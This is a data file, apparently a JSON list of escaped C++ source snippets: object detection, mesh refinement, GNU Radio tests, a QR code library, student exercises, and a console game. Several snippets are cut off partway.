vector<Detection> output;\n    vector<int> nms_result;\n    cv::dnn::NMSBoxes(boxes, confidences, SCORE_THRESHOLD, NMS_THRESHOLD, nms_result);\n    for (int i = 0; i < nms_result.size(); i++)\n    {\n        int idx = nms_result[i];\n        Detection result;\n        result.class_id = class_ids[idx];\n        result.confidence = confidences[idx];\n        result.box = boxes[idx];\n        output.push_back(result);\n    }\n\n    DetectionData ret;\n    ret.detections = output;\n    if (draw)\n    {\n        image = this->draw(image, output);\n    }\n    ret.image = image;\n\n    return ret;\n}\n\ncv::Mat Yolov5Detector::draw(cv::Mat image, const vector<Detection> detections)\n{\n    for (const Detection &detection : detections)\n    {\n        cv::Rect box = detection.box;\n        int classId = detection.class_id;\n        const auto &color = this->colors[classId % this->colors.size()];\n        cv::rectangle(image, box, color, 3);\n        cv::rectangle(image, cv::Point(box.x, box.y - 20), cv::Point(box.x + box.width, box.y), color, cv::FILLED);\n        cv::putText(image, this->classNames[classId], cv::Point(box.x, box.y - 5), cv::FONT_HERSHEY_SIMPLEX, 0.5,\n                    cv::Scalar(0, 0, 0));\n    }\n\n    return image;\n}\n",
    "//#define Check_Flip_Tets\n#include <mtet/mtet.h>\n#include <mtet/io.h>\n#include <ankerl/unordered_dense.h>\n#include <span>\n#include <queue>\n#include <optional>\n#include <SmallVector.h>\n\n#include <implicit_functions.h>\n#include <subdivide_multi.h>\n#include <CLI/CLI.hpp>\n#include <tet_quality.h>\n#include <timer.h>\n#include <grid_mesh.h>\n\n\nusing namespace mtet;\n\nbool save_mesh_json(const std::string& filename,\n                    const mtet::MTetMesh mesh)\n{\n    vector<array<double, 3>> vertices((int)mesh.get_num_vertices());\n    vector<array<size_t, 4>> tets((int)mesh.get_num_tets());\n    using IndexMap = ankerl::unordered_dense::map<uint64_t, size_t>;\n    IndexMap vertex_tag_map;\n    vertex_tag_map.reserve(mesh.get_num_vertices());\n    int counter = 0;\n    mesh.seq_foreach_vertex([&](VertexId vid, std::span<const Scalar, 3> data){\n        size_t vertex_tag = vertex_tag_map.size() + 1;\n        vertex_tag_map[value_of(vid)] = vertex_tag;\n        vertices[counter] = {data[0], data[1], data[2]};\n        counter ++;\n    });\n    counter = 0;\n    mesh.seq_foreach_tet([&](TetId, std::span<const VertexId, 4> data) {\n        tets[counter] = {vertex_tag_map[value_of(data[0])] - 1, vertex_tag_map[value_of(data[1])] - 1, vertex_tag_map[value_of(data[2])] - 1, vertex_tag_map[value_of(data[3])] - 1};\n        counter ++;\n    });\n    if (std::filesystem::exists(filename.c_str())){\n        std::filesystem::remove(filename.c_str());\n    }\n    using json = nlohmann::json;\n    std::ofstream fout(filename.c_str(),std::ios::app);\n    json jOut;\n    jOut.push_back(json(vertices));\n    jOut.push_back(json(tets));\n    fout << jOut.dump(4, ' ', true, json::error_handler_t::replace) << std::endl;\n    fout.close();\n    return true;\n}\n\nbool save_function_json(const std::string& filename,\n                        const mtet::MTetMesh mesh,\n                        ankerl::unordered_dense::map<uint64_t, llvm_vecsmall::SmallVector<std::array<double, 4>, 20>> vertex_func_grad_map,\n                        const size_t funcNum)\n{\n    vector<vector<double>> values(funcNum);\n    for (size_t funcIter = 0; funcIter <  funcNum; funcIter++){\n        values[funcIter].reserve(((int)mesh.get_num_vertices()));\n    }\n    mesh.seq_foreach_vertex([&](VertexId vid, std::span<const Scalar, 3> data){\n        llvm_vecsmall::SmallVector<std::array<double, 4>, 20> func_gradList(funcNum);\n        func_gradList = vertex_func_grad_map[value_of(vid)];\n        for (size_t funcIter = 0; funcIter < funcNum; funcIter++){\n            cout << data[0] << \" \" << data[1] << \" \" << data[2] << \": \" << func_gradList[funcIter][0] << \", \" << func_gradList[funcIter][1] << \", \" << func_gradList[funcIter][2] << \", \" << func_gradList[funcIter][3] << endl;\n            values[funcIter].push_back(func_gradList[funcIter][0]);\n        }\n    });\n    if (std::filesystem::exists(filename.c_str())){\n        std::filesystem::remove(filename.c_str());\n    }\n    using json = nlohmann::json;\n    std::ofstream fout(filename.c_str(),std::ios::app);\n    json jOut;\n    for (size_t funcIter = 0; funcIter <  funcNum; funcIter++){\n        json jFunc;\n        jFunc[\"type\"] = \"customized\";\n        jFunc[\"value\"] = values[funcIter];\n        jOut.push_back(jFunc);\n    }\n    fout << jOut.dump(4, ' ', true, json::error_handler_t::replace) << std::endl;\n    fout.close();\n    return true;\n}\n//hash for mounting a boolean that represents the activeness to a tet\n//since the tetid isn't const during the process, mount the boolean using vertexids of 4 corners.\nuint64_t vertexHash(std::span<VertexId, 4>& x)\n{\n    ankerl::unordered_dense::hash<uint64_t> hash_fn;\n    return hash_fn(value_of(x[0])) + hash_fn(value_of(x[1])) + hash_fn(value_of(x[2])) + hash_fn(value_of(x[3]));\n}\n\nint main(int argc, const char *argv[])\n{\n    struct\n    {\n        string mesh_file;\n        string function_file;\n        double threshold = 0.0001;\n        double alpha = std::numeric_limits<double>::infinity();\n        int max_elements = -1;\n        double smallest_edge_length = 0;\n        string method = \"IA\";\n        string csg_file;\n        bool bfs = false;\n        bool dfs = false;\n        bool curve_network = false;\n        //bool analysis_mode = false;\n    } args;\n    CLI::App app{\"Longest Edge Bisection Refinement\"};\n    app.add_option(\"mesh\", args.mesh_file, \"Initial mesh file\")->required();\n    app.add_option(\"function\", args.function_file, \"Implicit function file\")->required();\n    app.add_option(\"-t,--threshold\", args.threshold, \"Threshold value\");\n    app.add_option(\"-a,--alpha\", args.alpha, \"Alpha value\");\n    app.add_option(\"-o,--option\", args.method, \"Options of implicit manifold\");\n    app.add_option(\"--tree\", args.csg_file, \"CSG Tree file\");\n    app.add_option(\"-m,--max-elements\", args.max_elements, \"Maximum number of elements\");\n    app.add_option(\"-s,--shortest-edge\", args.smallest_edge_length, \"Shortest edge length\");\n    app.add_option(\"-b, --bfs\", args.bfs, \"Toggle BFS Mode\");\n    app.add_option(\"-d, --dfs\", args.dfs, \"Togg",
    "#include <fmt/core.h>\n#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/packet_strobe.hpp>\n#include <gnuradio-4.0/packet-modem/packet_to_stream.hpp>\n#include <gnuradio-4.0/packet-modem/throttle.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <pmtv/pmt.hpp>\n#include <boost/ut.hpp>\n#include <chrono>\n#include <numeric>\n#include <thread>\n\nint main()\n{\n    using namespace boost::ut;\n\n    gr::Graph fg;\n\n    const double samp_rate = 100e3;\n    auto& source = fg.emplaceBlock<gr::packet_modem::PacketStrobe<int>>(\n        25U, std::chrono::seconds(3), \"packet_len\");\n    auto& packet_to_stream = fg.emplaceBlock<gr::packet_modem::PacketToStream<int>>();\n    auto& throttle = fg.emplaceBlock<gr::packet_modem::Throttle<int>>(samp_rate);\n    auto& sink = fg.emplaceBlock<gr::packet_modem::VectorSink<int>>();\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(source).to<\"in\">(packet_to_stream)));\n    expect(eq(gr::ConnectionResult::SUCCESS,\n              fg.connect<\"out\">(packet_to_stream).to<\"in\">(throttle)));\n    expect(eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(throttle).to<\"in\">(sink)));\n\n    gr::scheduler::Simple sched{ std::move(fg) };\n    gr::MsgPortOut toScheduler;\n    expect(eq(gr::ConnectionResult::SUCCESS, toScheduler.connect(sched.msgIn)));\n    std::thread stopper([&toScheduler]() {\n        std::this_thread::sleep_for(std::chrono::seconds(10));\n        gr::sendMessage<gr::message::Command::Set>(toScheduler,\n                                                   \"\",\n                                                   gr::block::property::kLifeCycleState,\n                                                   { { \"state\", \"REQUESTED_STOP\" } });\n    });\n    expect(sched.runAndWait().has_value());\n    stopper.join();\n\n    const auto data = sink.data();\n    std::print(\"vector sink contains {} items\\n\", data.size());\n    std::print(\"vector sink tags:\\n\");\n    const auto sink_tags = sink.tags();\n    for (const auto& t : sink_tags) {\n        fmt::print(\"index = {}, map = {}\\n\", t.index, t.map);\n    }\n\n    return 0;\n}\n",
    "/*\n * QR Code generator library (C++)\n *\n * Copyright (c) Project Nayuki. (MIT License)\n * https://www.nayuki.io/page/qr-code-generator-library\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy of\n * this software and associated documentation files (the \"Software\"), to deal in\n * the Software without restriction, including without limitation the rights to\n * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of\n * the Software, and to permit persons to whom the Software is furnished to do so,\n * subject to the following conditions:\n * - The above copyright notice and this permission notice shall be included in\n *   all copies or substantial portions of the Software.\n * - The Software is provided \"as is\", without warranty of any kind, express or\n *   implied, including but not limited to the warranties of merchantability,\n *   fitness for a particular purpose and noninfringement. In no event shall the\n *   authors or copyright holders be liable for any claim, damages or other\n *   liability, whether in an action of contract, tort or otherwise, arising from,\n *   out of or in connection with the Software or the use or other dealings in the\n *   Software.\n */\n\n#include <algorithm>\n#include <cassert>\n#include <climits>\n#include <cstddef>\n#include <cstdlib>\n#include <cstring>\n#include <sstream>\n#include <utility>\n#include \"qrcodegen.hpp\"\n\nusing std::int8_t;\nusing std::uint8_t;\nusing std::size_t;\nusing std::vector;\n\n\nnamespace qrcodegen {\n\n/*---- Class QrSegment ----*/\n\nQrSegment::Mode::Mode(int mode, int cc0, int cc1, int cc2) :\n        modeBits(mode) {\n    numBitsCharCount[0] = cc0;\n    numBitsCharCount[1] = cc1;\n    numBitsCharCount[2] = cc2;\n}\n\n\nint QrSegment::Mode::getModeBits() const {\n    return modeBits;\n}\n\n\nint QrSegment::Mode::numCharCountBits(int ver) const {\n    return numBitsCharCount[(ver + 7) / 17];\n}\n\n\nconst QrSegment::Mode QrSegment::Mode::NUMERIC     (0x1, 10, 12, 14);\nconst QrSegment::Mode QrSegment::Mode::ALPHANUMERIC(0x2,  9, 11, 13);\nconst QrSegment::Mode QrSegment::Mode::BYTE        (0x4,  8, 16, 16);\nconst QrSegment::Mode QrSegment::Mode::KANJI       (0x8,  8, 10, 12);\nconst QrSegment::Mode QrSegment::Mode::ECI         (0x7,  0,  0,  0);\n\n\nQrSegment QrSegment::makeBytes(const vector<uint8_t> &data) {\n    if (data.size() > static_cast<unsigned int>(INT_MAX))\n        throw std::length_error(\"Data too long\");\n    BitBuffer bb;\n    for (uint8_t b : data)\n        bb.appendBits(b, 8);\n    return QrSegment(Mode::BYTE, static_cast<int>(data.size()), std::move(bb));\n}\n\n\nQrSegment QrSegment::makeNumeric(const char *digits) {\n    BitBuffer bb;\n    int accumData = 0;\n    int accumCount = 0;\n    int charCount = 0;\n    for (; *digits != '\\0'; digits++, charCount++) {\n        char c = *digits;\n        if (c < '0' || c > '9')\n            throw std::domain_error(\"String contains non-numeric characters\");\n        accumData = accumData * 10 + (c - '0');\n        accumCount++;\n        if (accumCount == 3) {\n            bb.appendBits(static_cast<uint32_t>(accumData), 10);\n            accumData = 0;\n            accumCount = 0;\n        }\n    }\n    if (accumCount > 0)  // 1 or 2 digits remaining\n        bb.appendBits(static_cast<uint32_t>(accumData), accumCount * 3 + 1);\n    return QrSegment(Mode::NUMERIC, charCount, std::move(bb));\n}\n\n\nQrSegment QrSegment::makeAlphanumeric(const char *text) {\n    BitBuffer bb;\n    int accumData = 0;\n    int accumCount = 0;\n    int charCount = 0;\n    for (; *text != '\\0'; text++, charCount++) {\n        const char *temp = std::strchr(ALPHANUMERIC_CHARSET, *text);\n        if (temp == nullptr)\n            throw std::domain_error(\"String contains unencodable characters in alphanumeric mode\");\n        accumData = accumData * 45 + static_cast<int>(temp - ALPHANUMERIC_CHARSET);\n        accumCount++;\n        if (accumCount == 2) {\n            bb.appendBits(static_cast<uint32_t>(accumData), 11);\n            accumData = 0;\n            accumCount = 0;\n        }\n    }\n    if (accumCount > 0)  // 1 character remaining\n        bb.appendBits(static_cast<uint32_t>(accumData), 6);\n    return QrSegment(Mode::ALPHANUMERIC, charCount, std::move(bb));\n}\n\n\nvector<QrSegment> QrSegment::makeSegments(const char *text) {\n    // Select the most efficient segment encoding automatically\n    vector<QrSegment> result;\n    if (*text == '\\0');  // Leave result empty\n    else if (isNumeric(text))\n        result.push_back(makeNumeric(text));\n    else if (isAlphanumeric(text))\n        result.push_back(makeAlphanumeric(text));\n    else {\n        vector<uint8_t> bytes;\n        for (; *text != '\\0'; text++)\n            bytes.push_back(static_cast<uint8_t>(*text));\n        result.push_back(makeBytes(bytes));\n    }\n    return result;\n}\n\n\nQrSegment QrSegment::makeEci(long assignVal) {\n    BitBuffer bb;\n    if (assignVal < 0)\n        throw std::domain_error(\"ECI assignment value out of range\");\n    else if (assignVal < (1 << 7))\n        bb.appendBits(static_cast<u",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nmain() {\n    int n;\n    cin >> n;\n\n    vector <int> a(n);//int a[n];\n    for(int i = 0; i < n; i++) {\n        cin >> a[i];\n    }\n\n    int len = ceil( sqrt(n) );// ceil()\n    vector <int> b(len);//int b[3];\n\n    //\u10d5\u10e5\u10db\u10dc\u10d8\u10d7 \u10e4\u10d4\u10e1\u10d5\u10dc\u10d8 n \u10d6\u10dd\u10db\u10d8\u10e1 \u10d0\u10ee\u10d0\u10da \u10db\u10d0\u10e1\u10d8\u10d5\u10e1 \u10d3\u10d0 \u10db\u10d0\u10d2 \u10d1\u10da\u10dd\u10d9\u10d4\u10d1\u10e8\u10d8 \u10d5\u10d8\u10dc\u10d0\u10ee\u10d0\u10d5\u10d7 \u10ef\u10d0\u10db\u10e1\n    for(int i = 0; i < n; i++) {\n        b[i / len] += a[i];\n        // i/len \u10d4\u10e1 \u10d0\u10e0\u10d8\u10e1 \u10d0\u10e1\u10d4\u10d7\u10d8 \u10e0\u10d0\u10e6\u10d0\u10ea: n=8, len=3, \n        //0,1,2 \u10d4\u10d9\u10e3\u10d7\u10d5\u10dc\u10d8\u10e1 b[0] (b[i/len]),\u10e0\u10d0\u10d3\u10d2\u10d0\u10dc \u10d2\u10d0\u10e7\u10dd\u10e4\u10d8\u10e1\u10d0\u10e1 0-\u10d8\u10d0\n        //3,4,5 \u10d4\u10d9\u10e3\u10d7\u10d5\u10dc\u10d8\u10e1 \u10db\u10d4\u10dd\u10e0\u10d4 \u10d1\u10da\u10dd\u10d9\u10e1 b[1]\n        //\u10ee\u10dd\u10da\u10dd 6,7,8 \u10d4\u10d9\u10e3\u10d7\u10d5\u10dc\u10d8\u10e1 \u10db\u10d4\u10e1\u10d0\u10db\u10d4 \u10d1\u10da\u10dd\u10d9\u10e1\n    }\n    \n    int q;\n    // cin >> q;\n    //3-17\n    // while(q--) {\n        int l, r;\n        cin >> l >> r;\n        \n        int sum = 0;\n        for(int i = l; i <= r; ) {\n            if(i % len == 0 && (i + len) <= r) {//\u10d7\u10e3 \u10d1\u10da\u10dd\u10d9\u10d8 \u10ef\u10d3\u10d4\u10d1\u10d0 \u10db\u10d7\u10da\u10d8\u10d0\u10dc\u10d0\u10d3 \u10e8\u10e3\u10d0\u10da\u10d4\u10d3\u10e8\u10d8, \u10db\u10d0\u10e8\u10d8\u10dc \u10db\u10d7\u10da\u10d8\u10d0\u10dc \u10d1\u10da\u10dd\u10d9\u10e1 \u10d5\u10ef\u10d0\u10db\u10d0\u10d5\u10d7\n                sum += b[i/len];\n                i += len;\n            } else {//\u10e1\u10ee\u10d5\u10d0 \u10db\u10ee\u10e0\u10d8\u10d5 i-\u10e3\u10e0 \u10d4\u10da\u10d4\u10db\u10d4\u10dc\u10e2\u10e1 (3%5=3)\n                sum += a[i];\n                i++;\n            }\n        }\n        cout << sum << endl;\n    // }\n}\n\n\n\n/*\nvector <int> a(10000);\nint len,l,r;\nint n;\nvector <int> b(1000);\n\nvoid update(int idx, int val) {\n    int blockNumber = idx / len;\n    b[blockNumber] += val - a[idx];\n    a[idx] = val;\n}\n\nvoid sqrt_dec(int len) {\n    for(int i = 0; i < n; i++) {\n        b[i / len] += a[i];\n    }\n}\n\nint read(int l, int r) {\n    int sum = 0;\n    for(int i = l; i <= r; ) {\n        if(i % len == 0 && (i + len) <= r) {//\u10d7\u10e3 \u10d1\u10da\u10dd\u10d9\u10d8 \u10ef\u10d3\u10d4\u10d1\u10d0 \u10db\u10d7\u10da\u10d8\u10d0\u10dc\u10d0\u10d3 \u10e8\u10e3\u10d0\u10da\u10d4\u10d3\u10e8\u10d8, \u10db\u10d0\u10e8\u10d8\u10dc \u10db\u10d7\u10da\u10d8\u10d0\u10dc \u10d1\u10da\u10dd\u10d9\u10e1 \u10d5\u10ef\u10d0\u10db\u10d0\u10d5\u10d7\n            sum += b[i/len];\n            i += len;\n        } else {//\u10e1\u10ee\u10d5\u10d0 \u10db\u10ee\u10e0\u10d8\u10d5 i-\u10e3\u10e0 \u10d4\u10da\u10d4\u10db\u10d4\u10dc\u10e2\u10e1 (3%5=3)\n            sum += a[i];\n            i++;\n        }\n    }\n    return sum;\n}\n\nmain() {\n    cin >> n;\n    for(int i = 0; i < n; i++) {\n        cin >> a[i];\n    }\n\n    len = ceil( sqrt(n) );// ceil()\n    sqrt_dec(len);\n    \n    cin >> l >> r;\n    cout << read(l,r)<<endl;\n\n    update(8,2);\n    cout << read(3,17);\n\n}\n*/",
    "#include <iostream>\r\n#include <cstring> // For strcat()\r\nclass Convert {\r\nprivate:\r\n char infix[20];\r\n char postfix[20];\r\n char s[20];\r\n int top;\r\n int i;\r\n int p;\r\npublic:\r\n Convert() {\r\n top = -1;\r\n i = p = 0;\r\n std::cout << \"\\nEnter infix Expression:\";\r\n std::cin >> infix;\r\n strcat(infix, \")\");\r\n s[++top] = '(';\r\n }\r\n int precedence(char);\r\n void post();\r\n void display();\r\n};\r\nint Convert::precedence(char ch) {\r\n switch(ch) {\r\n case '^': return 3;\r\n case '*': return 2;\r\n case '/': return 2;\r\n case '+': return 1;\r\n case '-': return 1;\r\n default: return 0;\r\n }\r\n}\r\nvoid Convert::post() {\r\n char ch;\r\n while (top != -1) {\r\n ch = infix[i++];\r\n if ((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') || (ch >= '1' && ch <= '9'))\r\n postfix[p++] = ch;\r\n else if (ch == '(')\r\n s[++top] = ch;\r\n else if (ch == '+' || ch == '-' || ch == '*' || ch == '/' || ch == '^') {\r\n while (precedence(ch) <= precedence(s[top]))\r\n postfix[p++] = s[top--];\r\n s[++top] = ch;\r\n } else if (ch == ')') {\r\n while (s[top] != '(')\r\n postfix[p++] = s[top--];\r\n top--;\r\n } else\r\n std::cout << \"\\nWrong string\";\r\n }\r\n postfix[p] = '\\0';\r\n}\r\nvoid Convert::display() {\r\n std::cout << \"\\nPostfix Expression is: \" << postfix;\r\n}\r\nint main() {\r\n Convert c;\r\n c.post();\r\n c.display();\r\n return 0;\r\n}\r\n\r\n",
    "#include \"../../Includes/Gadget/Dice.h\"\n\n// Public\n\nDice::Dice(uint8_t amount, uint8_t successRate) {\n\tthis->focusCount = 0;\n\tthis->movementPoint = 0;\n\tthis->amount = amount;\n\tthis->result.resize(this->amount, false);\n\tthis->successRate.resize(this->amount, successRate);\n\tthis->rateAddition.resize(this->amount, 0);\n}\n\nDice::Dice(std::vector<uint8_t> successRate) {\n\tthis->focusCount = 0;\n\tthis->movementPoint = 0;\n\tthis->amount = successRate.size();\n\tthis->result.resize(this->amount, false);\n\tthis->successRate.resize(this->amount, 0);\n\tfor (int i = 0; i < this->amount; i++)\n\t\tthis->successRate[i] = std::min<uint8_t>(90, successRate[i]); // successRate := Stat::Speed / 100, but not exceed 90.\n\tthis->rateAddition.resize(this->amount, 0);\n}\n\n\nDice::Dice(uint8_t speed) {\n\tthis->focusCount = 0;\n\tthis->movementPoint = 0;\n\tthis->amount = static_cast<uint8_t>(speed / 10); // MaxMovementPoint := Stat::Speed / 10\n\tthis->result.resize(this->amount, false);\n\tthis->rateAddition.resize(this->amount, 0);\n\tthis->successRate.resize(this->amount, std::min<uint8_t>(90, speed)); // successRate := Stat::Speed / 100, but not exceed 90.\n}\n\nvoid Dice::RollDice(void) {\n\t// Random Engine\n\tstd::random_device rd;\n\tstd::mt19937 gen(rd());\n\tstd::uniform_int_distribution<> dis(0, 99);\n\tthis->movementPoint = 0;\n\n\t// Roll Dice\n\tfor (int i = 0; i < this->amount; i++) {\n\t\tthis->result[i] = (dis(gen) < this->successRate[i] + this->rateAddition[i]) || (i < focusCount);\n\t\tif (this->result[i]) {\n\t\t\tthis->movementPoint++;\n\t\t}\n\t}\n\n\t// Reset FocusCount and RateAddition\n\tthis->focusCount = 0;\n\tthis->rateAddition.clear();\n\tthis->rateAddition.resize(this->amount, 0);\n}\n\nvoid Dice::setMovementPoint(const uint8_t movementPoint) {\n\tthis->movementPoint = movementPoint;\n}\n\nvoid Dice::SetAmount(const uint8_t amount) {\n\tthis->amount = amount;\n}\n\nvoid Dice::SetFocusCount(const uint8_t focusCount) {\n\tif (focusCount > this->amount)\n\t\treturn;\n\n\tthis->focusCount = focusCount;\n}\n\nvoid Dice::SetSuccessRate(const std::vector<uint8_t>& successRate) {\n\tthis->successRate = successRate;\n}\n\nvoid Dice::SetRateAddition(const std::vector<double>& rateAddition) {\n\tthis->rateAddition = rateAddition;\n}\n\nvoid Dice::SetResult(const std::vector<bool>& result) {\n\tthis->result = result;\n}\n\nuint8_t Dice::GetMovementPoint(void) {\n\treturn this->movementPoint;\n}\n\nuint8_t Dice::GetAmount(void) {\n\treturn this->amount;\n}\n\nuint8_t Dice::GetFocusCount(void) {\n\treturn this->focusCount;\n}\n\nstd::vector<uint8_t> Dice::GetSuccessRate(void) {\n\treturn this->successRate;\n}\n\nstd::vector<double> Dice::GetRateAddition(void) {\n\treturn this->rateAddition;\n}\n\nstd::vector<bool> Dice::GetResult(void) {\n\treturn this->result;\n}",
    "#include <iostream>\n#include <windows.h>\n#include <conio.h>\n#include <time.h>\n#include <vector>\n#include <chrono>\n#include <locale.h>\n\nusing namespace std;\nusing namespace std::chrono;\n\n// Estrutura para o display in game\nstruct Display {\n    float tempo;\n    int movimento;\n    int qtdBombas;\n};\n\n// Estrutura para representar os inimigos\nstruct Inimigo\n{\n    int x;\n    int y;\n};\n\n// Estrutura para representar os jogadores\nstruct Jogador\n{\n    short int x;\n    short int y;\n    short int vidas = 1;\n    short int maximoBombas = 1;\n    bool resisteBomba = false;\n    bool raioBomba = 1;\n    bool bombaRelogio = false;\n    bool noclip = false;\n    bool noclipBomba = false;\n};\n\n// Estrutura para representar as bombas\nstruct Bomba\n{\n    bool ativa;\n    short int x;\n    short int y;\n};\n\n\n// Fun\u00e7\u00e3o para verificar se o movimento \u00e9 v\u00e1lido\n\nbool verificaMovimento(int m[][15], int x, int y)\n{\n    if (m[x][y] == 8){\n        return m[x][y];\n    }\n    return m[x][y] == 0;\n}\n\n//bool chancePowerUp ()\n//{\n//    int chance = rand() % 100+1;\n//    if (chance < 100)\n//    {\n//        return true;\n//    }\n//    else {\n//\n//        return false;\n//    }\n//\n//}\n\n//int powerUp()\n//{\n//    chancePowerUp();\n//    if (chancePowerUp)\n//     int tipoPowerUp = 2; //0 para aumento da quantidade de bombas, 1 vida extra, 2 para invencibilidade contra bomba e 3 para atravessar blocos quebraveis\n//        return tipoPowerUp;\n//\n//}\n//bool resisteBomba()\n//{\n//    int tipo = powerUp();\n//    if (tipo == 2){\n//        return resisteBomba;\n//\n//    }\n//    else {\n//        return false;\n//    }\n//}\n\n// Fun\u00e7\u00e3o para mover os inimigos\n\nvoid moverInimigos(int m[][15], vector<Inimigo>& inimigos)\n{\n    for (auto& inimigo : inimigos)\n    {\n        int dir = rand() % 4; // 0 para cima, 1 para baixo, 2 para esquerda, 3 para direita\n        switch (dir)\n        {\n        case 0:\n            if (verificaMovimento(m, inimigo.x - 1, inimigo.y))\n            {\n                inimigo.x--;\n            }\n            break;\n        case 1:\n            if (verificaMovimento(m, inimigo.x + 1, inimigo.y))\n            {\n                inimigo.x++;\n            }\n            break;\n        case 2:\n            if (verificaMovimento(m, inimigo.x, inimigo.y - 1))\n            {\n                inimigo.y--;\n            }\n            break;\n        case 3:\n            if (verificaMovimento(m, inimigo.x, inimigo.y + 1))\n            {\n                inimigo.y++;\n            }\n            break;\n        }\n    }\n\n}\n\n// Fun\u00c3\u00a7\u00c3\u00a3o para definir o estado do jogo\nvoid definirJogo(int m[][15], const vector<Inimigo>& inimigos, const Jogador& jogador, const Bomba& bomba, int& contadorPiscadasBomba, const Display& ingameDisplay)\n{\n    COORD coord;\n    coord.X = 0;\n    coord.Y = 0;\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\n\n    for (int i = 0; i < 15; i++)\n    {\n        for (int j = 0; j < 15; j++)\n        {\n            if (i == jogador.x && j == jogador.y)\n            {\n                cout << char(36);\n            }\n            else if (bomba.x == i && bomba.y == j && bomba.ativa && contadorPiscadasBomba % 2 == 0)\n            {\n                cout << char(184); // Exibe a bomba se o contador de piscadas for par\n            }\n            else\n            {\n                bool verificaInimigo = false;\n                for (const auto& inimigo : inimigos)\n                {\n                    if (i == inimigo.x && j == inimigo.y)\n                    {\n                        cout << char(159);\n                        verificaInimigo = true;\n                        break;\n                    }\n                }\n                if (!verificaInimigo)\n\n                {\n                    switch (m[i][j])\n                    {\n                    case 0:\n                        cout << \" \";\n                        break;\n                    case 1:\n                        cout << char(219);\n                        break;\n                    case 2:\n                        cout << char(35);\n                        break; // Paredes quebr\u00c3\u00a1veis\n                    case 3:\n                        cout << char(157);\n                        break; // bomba\n                    case 4:\n                        cout << char(159);\n                        break; // Inimigo\n                    case 5:\n                        cout << char(36);\n                        break; // Jogador\n                    case 7:\n                        cout << char(134);\n\n                        break; // explos\u00e3o\n                    case 8:\n                        cout << char(5);\n                        break; //powerup\n                    case 9:\n                        cout << char(75);\n                        break;\n                    case 10:\n                        cout << char(75);\n                        break;\n                    case 11:\n                        cout << char(75);\n                        break;\n                    case 12:\n                        cout << char(75);\n    ",
    "#include <iostream>\n\n\nusing namespace std;\n\n// costanti che definiscono il numero massimo di righe e colonne\nconst int righeMax=30;\nconst int colonneMax=30;\n\n//prototipi\nvoid caricaMatrice(int matrix[righeMax][colonneMax], int &righe, int &colonne);\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax], int righe, int colonne);\nint Menu();\n\nint main() {\n\n  int scelta;\n  int righe, colonne;\n  int matrix[righeMax][colonneMax];\n  do {\n    scelta=Menu();\n    switch(scelta) {\n      case 1:\n        caricaMatrice(matrix,righe,colonne);\n      break;\n      case 2:\n        visualizzaMatrice(matrix,righe,colonne);\n      break;\n      case 0:\n        cout<<\"Esci\"<<endl;\n      break;\n      default:\n        cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n      break;\n    }\n  }while(scelta!=0);\n  \n}\n\n\nint Menu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Carica matrice\"<<endl;\n  cout<<\"2-Visualizza matrice\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\n\nvoid caricaMatrice(int matrix[righeMax][colonneMax], int &righe, int &colonne) {\n\n  cout<<endl;\n\n  do{\n    cout<<\"Inserisci il numero di righe: \";\n    cin>>righe;\n    if(righe<=0||righe>righeMax) {\n      cout<<\"Errore\"<<endl;\n    }\n  }while(righe<=0||righe>righeMax);\n\n  do{\n    cout<<\"Inserisci il numero di colonne: \";\n    cin>>colonne;\n    if(colonne<=0||colonne>colonneMax) {\n      cout<<\"Errore\"<<endl;\n    }\n  }while(colonne<=0||colonne>colonneMax);\n\n  for(int i=0; i<righe; i++) {\n    for(int j=0; j<colonne; j++) {\n      cout<<\"Inserisci il valore della cella \"<<i+1<<\" \"<<j+1<<\": \";\n      cin>>matrix[i][j];\n    }\n  }\n\n\n  cout<<endl;\n  \n}\n\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax], int righe, int colonne) {\n\n  cout<<endl;\n  \n  for(int i=0; i<righe; i++) {\n    for(int j=0; j<colonne; j++) {\n      cout<<matrix[i][j]<<\"\\t\";\n    }\n    cout<<endl;\n  }\n\n  cout<<endl;\n  \n}\n",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized random forest (grf).\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include \"SamplingOptions.h\"\n#include <unordered_map>\n#include \"commons/globals.h\"\n\nnamespace grf {\n\nSamplingOptions::SamplingOptions():\n    num_samples_per_cluster(0),\n    clusters(0) {}\n\nSamplingOptions::SamplingOptions(uint samples_per_cluster,\n                                 const std::vector<size_t>& sample_clusters):\n    num_samples_per_cluster(samples_per_cluster) {\n\n  // Map the provided clusters to IDs in the range 0 ... num_clusters.\n  // \u4e3a\u6bcf\u4e2a cluster \u5206\u914d\u4e00\u4e2a\u552f\u4e00\u6807\u8bc6\u7b26\n  std::unordered_map<size_t, size_t> cluster_ids;\n  for (size_t cluster : sample_clusters) {\n    if (cluster_ids.find(cluster) == cluster_ids.end()) {\n      size_t cluster_id = cluster_ids.size();\n      cluster_ids[cluster] = cluster_id;\n    }\n  }\n\n  // Populate the index of each cluster ID with the samples it contains.\n  clusters = std::vector<std::vector<size_t>>(cluster_ids.size());\n  for (size_t sample = 0; sample < 